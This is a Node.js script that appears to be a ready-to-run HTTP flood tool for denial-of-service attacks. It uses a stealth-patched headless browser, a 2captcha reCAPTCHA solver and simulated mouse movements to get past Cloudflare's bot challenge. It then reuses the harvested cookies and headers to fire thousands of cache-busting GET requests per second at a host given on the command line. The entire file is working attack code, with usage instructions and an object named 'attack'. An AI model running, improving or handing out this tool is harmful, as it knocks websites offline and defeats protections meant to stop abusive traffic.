const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
const puppeteerAnonymize = require("puppeteer-extra-plugin-anonymize-ua");
const AdblockerPlugin = require('puppeteer-extra-plugin-adblocker');
const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha'); // NEW

// UNHANDLED ERROR LOGGER
process.on('unhandledRejection', err => {
    console.error('[UNHANDLED]', err.message);
});

// Recaptcha solving config
puppeteer.use(RecaptchaPlugin({
    provider: {
        id: '2captcha',
        token: 'YOUR_2CAPTCHA_API_KEY' // <<-- PUT YOUR 2Captcha API KEY HERE
    },
    visualFeedback: false
}));

// PLUGINS
puppeteer.use(puppeteerStealth());
puppeteer.use(puppeteerAnonymize());
puppeteer.use(AdblockerPlugin({ blockTrackers: true }));

// REST OF YOUR CODE UNCHANGED
const USER_AGENTS = [ /* ... your full list ... */ ];
const sleep = (duration) => new Promise(resolve => setTimeout(resolve, duration * 1000));

const parseArguments = () => {
    if (process.argv.length < 5) {
        console.error("Usage: node HTTP-IOS <host> <duration> <rates>");
        process.exit(1);
    }
    const [, , host, duration, rates, ...args] = process.argv;
    return { host, duration: parseInt(duration), rates: parseInt(rates) };
};

class brs {
    constructor(host, duration, rates) {
        this.host = host;
        this.duration = duration;
        this.rates = rates;
        this.headersBrowser = '';
    }

    async mouser(page) {
        const pageViewport = page.viewport();
        if (!pageViewport) return;
        for (let i = 0; i < 3; i++) {
            const x = Math.floor(Math.random() * pageViewport.width);
            const y = Math.floor(Math.random() * pageViewport.height);
            await page.mouse.click(x, y);
            await sleep(0.2);
        }
        const centerX = pageViewport.width / 2;
        const centerY = pageViewport.height / 2;
        await page.mouse.move(centerX, centerY);
        await page.mouse.down();
        const movements = [
            [centerX + 100, centerY],
            [centerX + 100, centerY + 100],
            [centerX, centerY + 100],
            [centerX, centerY]
        ];
        for (const [x, y] of movements) {
            await page.mouse.move(x, y, { steps: 10 });
            await sleep(0.2);
        }
        await page.mouse.up();
        await sleep(1.5);
    }

    async detectChallenge(browser, page) {
        const content = await page.content();
        if (content.includes("challenge-platform")) {
            try {
                await sleep(2.5);
                await page.solveRecaptchas(); // NEW
                await this.mouser(page);
                const element = await page.$('body > div.main-wrapper > div > div > div > div');
                if (element) {
                    const box = await element.boundingBox();
                    await page.mouse.click(box.x + 30, box.y + 30);
                }
                if (content.includes("challenge-platform")) {
                    await sleep(1);
                    await this.detectChallenge(browser, page);
                }
                await sleep(3);
            } catch (error) {
                console.error("[ERROR] Challenge detection failed:", error.message); // FIXED
            }
        }
    }

    async openBrowser(host) {
        const userAgent = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
        const options = {
            headless: true,
            args: [
                "--no-sandbox", "--no-first-run", "--test-type",
                `--user-agent=${userAgent}`,
                "--disable-browser-side-navigation",
                "--disable-extensions", "--disable-gpu",
                "--disable-dev-shm-usage", "--ignore-certificate-errors",
                "--disable-blink-features=AutomationControlled",
                "--disable-features=IsolateOrigins,site-per-process",
                "--disable-infobars", "--hide-scrollbars",
                "--disable-setuid-sandbox", "--mute-audio", "--no-zygote"
            ],
            ignoreHTTPSErrors: true,
            javaScriptEnabled: true,
        };

        let browser, page;
        try {
            browser = await puppeteer.launch(options);
            [page] = await browser.pages();
            const client = page._client();
            await page.setExtraHTTPHeaders({
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                'Accept-Encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'DNT': '1',
                'sec-ch-ua-mobile': '?1',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Mode': 'navigate',
                'sec-ch-ua-platform': 'Android',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Dest': 'document',
                'Referer': host,
            });

            const frameNavigatedHandler = (frame) => {
                if (frame.url().includes("challenges.cloudflare.com")) {
                    if (frame._id) {
                        client.send("Target.detachFromTarget", {
                            targetId: frame._id
                        }).catch(err => {
                            console.error("[ERROR] Frame navigation error:", err.message); // FIXED
                        });
                    }
                }
            };
            await page.on("framenavigated", frameNavigatedHandler);
            await page.setViewport({ width: 1920, height: 1200 });
            page.setDefaultNavigationTimeout(10000);

            const browserPage = await page.goto(host, { waitUntil: "domcontentloaded" });
            page.on('dialog', async dialog => await dialog.accept());
            const status = await browserPage.status();
            const title = await page.evaluate(() => document.title);

            if (['Just a moment...'].includes(title)) {
                console.log(`[INFO] Title: ${title}`);
                await page.on('response', async resp => {
                    this.headersBrowser = resp.request().headers();
                });
                await this.detectChallenge(browser, page);
            }

            const cookies = await page.cookies();
            const cookieString = cookies.map((c) => `${c.name}=${c.value}`).join("; ");

            return {
                title: await page.title(),
                headersall: this.headersBrowser,
                cookies: cookieString,
                userAgent: userAgent,
                browser: browser,
                page: page
            };
        } catch (error) {
            console.error("[ERROR] Open Browser Error:", error.message); // FIXED
            if (browser) await browser.close();
            return null;
        }
    }

    async flood(host, duration, rates, userAgent, cookies, headersbro) {
        console.log({ target: host, userAgent: userAgent, cookies: cookies });
        const endTime = Date.now() + duration * 1000;
        const url = new URL(host);

        const sendRequest = async () => {
            try {
                const response = await fetch(url, {
                    method: 'GET',
                    headers: {
                        'User-Agent': userAgent,
                        'accept': headersbro['accept'],
                        'accept-language': headersbro['accept-language'],
                        'accept-encoding': headersbro['accept-encoding'],
                        'cache-control': 'no-cache, no-store, private, max-age=0, must-revalidate',
                        'upgrade-insecure-requests': '1',
                        'sec-fetch-dest': headersbro['sec-fetch-dest'],
                        'sec-fetch-mode': headersbro['sec-fetch-mode'],
                        'sec-fetch-site': headersbro['sec-fetch-site'],
                        'TE': headersbro['trailers'],
                        'x-requested-with': 'XMLHttpRequest',
                        'pragma': 'no-cache',
                        'Cookie': cookies
                    }
                });
                if (response.status === 429) return;
            } catch (error) {
                console.error("[ERROR]", error.message); // FIXED
            }
        };

        const requestInterval = setInterval(() => {
            for (let i = 0; i < rates; i++) {
                sendRequest();
            }
            if (Date.now() >= endTime) {
                clearInterval(requestInterval);
            }
        }, 1);

        console.log(`[INFO] Flood started on ${rates} rates for ${duration} seconds`);
    }

    async start() {
        try {
            const response = await this.openBrowser(this.host);
            if (response) {
                if (['Just a moment...'].includes(response.title)) {
                    console.log("[INFO] Failed to bypass");
                    await response.browser.close();
                    await this.start();
                    return;
                }

                await this.flood(
                    this.host,
                    this.duration,
                    this.rates,
                    response.userAgent,
                    response.cookies,
                    response.headersall
                );
                await response.browser.close();
            }

            setTimeout(() => process.exit(0), this.duration * 1000);
        } catch (error) {
            console.error("[ERROR]", error.message); // FIXED
        }
    }
}

const main = async () => {
    const { host, duration, rates } = parseArguments();
    const attack = new brs(host, duration, rates);
    await attack.start();
};

main().catch(err => console.error("[MAIN ERROR]", err.message));
                
